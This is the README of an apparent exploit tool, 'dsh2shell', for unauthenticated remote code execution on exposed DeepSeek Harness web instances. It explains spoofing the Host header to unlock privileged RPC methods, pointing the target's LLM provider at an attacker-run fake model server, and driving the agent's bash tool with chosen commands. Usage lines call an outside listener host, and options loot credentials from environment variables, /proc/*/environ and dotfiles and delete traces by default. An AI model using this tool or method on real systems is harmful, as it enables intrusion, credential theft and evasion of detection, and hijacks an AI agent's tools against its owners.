# dsh2shell

Unauthenticated RCE PoC for exposed DeepSeek Harness (dsh) web instances.

**Principle**: spoofing the `Host` header unlocks dsh's privileged RPC methods, which lets the PoC point the target's LLM provider at its own built-in fake model server and drive the agent's bash tool with attacker-chosen commands — no real model or valid API key needed.

## Requirements

- Python 3.8+ (stdlib only)
- A listener address reachable **from the target** (e.g. your VPS public IP)

## Usage

```sh
python3 dsh2shell.py <target> --public-base http://<YOUR_IP>:9999/v1 [options]
```

Loot credentials (default action):

```sh
python3 dsh2shell.py https://target.example.com --loot-keys \
    --listen 0.0.0.0:9999 --public-base http://1.2.3.4:9999/v1
```

Run a specific command:

```sh
python3 dsh2shell.py https://target.example.com --cmd "id; cat /flag" \
    --public-base http://1.2.3.4:9999/v1
```

Options:

| Option | Meaning |
|---|---|
| `--cmd "..."` | Command to run; repeatable, executed in order |
| `--loot-keys` | Smart credential hunt (env, `/proc/*/environ`, `~/.dsh*`, dotfiles, key-pattern sweep) |
| `--listen host:port` | Fake-LLM bind address (default `0.0.0.0:9999`) |
| `--public-base url` | The `/v1` URL of that listener as seen from the target (omit for loopback targets) |
| `--no-cleanup` | Skip trace removal (default: session self-deletes and all settings are restored) |
| `--log-dir dir` | Per-target logs named after the URL (default `rce_logs/`) |

For authorized security testing only.
